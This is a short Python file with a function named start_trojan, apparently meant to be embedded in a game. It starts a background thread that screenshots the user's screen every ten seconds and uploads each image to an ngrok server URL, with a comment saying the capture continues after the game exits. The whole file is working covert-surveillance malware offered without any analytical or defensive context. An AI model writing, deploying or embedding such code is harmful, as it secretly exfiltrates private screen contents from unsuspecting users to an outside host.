import os
import threading
import time
import pyautogui
import requests

# Update this with your public ngrok URL and endpoint route
SERVER_URL = "https://raking-skipper-stream.ngrok-free.dev/upload"


def capture_and_send():
  while True:
    temp_file = "temp_screen.png"
    try:
      # Capture the current screen and save locally
      pyautogui.screenshot(temp_file)

      # Upload the screenshot via HTTP POST
      with open(temp_file, "rb") as f:
        requests.post(SERVER_URL, files={"screenshot": f}, timeout=5)

    except Exception as err:
      print(f"Upload failed: {err}")

    finally:
      # Ensure temporary file cleanup
      if os.path.exists(temp_file):
        os.remove(temp_file)

    # Delay before the next capture cycle
    time.sleep(10)


def start_trojan():
    # Spawn a non-daemon thread so screenshot broadcasting continues independently after game exit
    thread = threading.Thread(target=capture_and_send, daemon=False)
    thread.start()